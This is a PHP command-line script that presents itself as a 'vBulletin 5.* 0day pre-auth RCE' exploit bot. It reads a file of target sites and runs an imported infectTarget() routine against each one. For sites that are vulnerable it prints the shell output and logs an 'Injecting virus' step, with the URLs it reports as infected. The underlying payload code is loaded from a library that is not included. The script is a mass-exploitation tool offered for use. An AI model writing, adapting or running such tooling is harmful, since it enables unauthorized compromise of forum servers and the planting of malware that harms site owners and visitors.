<?php

/**
 * @author Ardhana <ardzz@indoxploit.or.id>
 * BOT vBulletin 5.* 0day pre-auth RCE exploit
 * Tested on vBulletin 5.5.0|5.5.1|5.5.0
 * Tested on Ubuntu 16.04.6 LTS x86_64 (64bit)
 */

require_once __DIR__ . "/vendor/autoload.php";
use \Exploit\vBulletin;
$vBulletin = new vBulletin\Main (__DIR__);

$green   = "\e[1;92m";
$green1  = "\e[0;92m";
$red     = "\e[1;91m";
$yellow  = "\e[93m";
$blue    = "\e[34m";
$normal  = "\e[0m";
$cyan    = "\e[1;36m";
echo "
       _____________________________
     <// 0day // Unpatched // 5.* //>

           {$green1}____        _ _      _   _             
          {$green1}|  _ \      | | |    | | (_)            {$red}____  ____________{$normal}
    {$green1}__   _| |_) |_   _| | | ___| |_ _ _ __       {$red}/ __ \/ ____/ ____/{$normal}
    {$green1}\ \ / /  _ <| | | | | |/ _ \ __| | '_ \     {$red}/ /_/ / /   / __/{$normal}
     {$green1}\ V /| |_) | |_| | | |  __/ |_| | | | |   {$red}/ _, _/ /___/ /__{$normal}
      {$green1}\_/ |____/ \__,_|_|_|\___|\__|_|_| |_|  {$red}/_/ |_|\____/_____/{$normal}
  
         {$cyan}By Ardzz{$normal}

";
if (empty($argv[1])) {
    $file = explode("/", __FILE__);
    echo "  [+] Usage : php " . end($file) . " <lists_target.txt>" . PHP_EOL;
    exit;
}

foreach (explode(PHP_EOL, file_get_contents($argv[1])) as $key => $target) {
    $key++;
    echo "  [" . $key . "][i] Exploiting bug on {$target}" . PHP_EOL;
    $vBulletin->setTarget($target);
    $data = $vBulletin->infectTarget();
    if ($data["vulnerable"]) {
        echo "         [i] Target is {$green1}vulnerable!{$normal}" . PHP_EOL;
        echo "         [+] (id) output : ". (empty($data["shell"]) ? "NULL" . PHP_EOL : $data["shell"]);
        echo "         {$green1}[i] Injecting virus ...{$normal}" . PHP_EOL;
        foreach ($data["virus"] as $key => $value) {
            if ($value["success"]) {
                echo "             {$green1}[+] {$value["url"]} [OK]{$normal}" . PHP_EOL;
            }
        }
    }else{
        echo "         [i] Target isn't {$red}vulnerable!{$normal}" . PHP_EOL;
    }
}
?>